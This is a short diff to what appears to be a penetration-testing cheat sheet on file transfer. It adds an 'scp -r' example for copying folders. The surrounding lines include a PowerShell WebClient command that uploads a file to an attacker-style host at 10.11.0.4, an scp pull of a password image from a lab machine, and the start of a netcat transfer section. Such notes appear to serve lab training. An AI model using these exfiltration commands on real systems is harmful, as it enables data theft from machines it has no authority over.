@@ -42,6 +42,10 @@ powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload
 scp john@localhost:/var/tmp/CopyMe.txt /tmp  
 scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2  
 scp -P 2222 student@192.168.79.112:/usr/share/kali-defaults/web/img/password.png /home/kali/
+```
+Transfer folder:
+scp -r folder_path user@ip:destinated_folder_path
+```
 
 ### NC transfering files
 ```
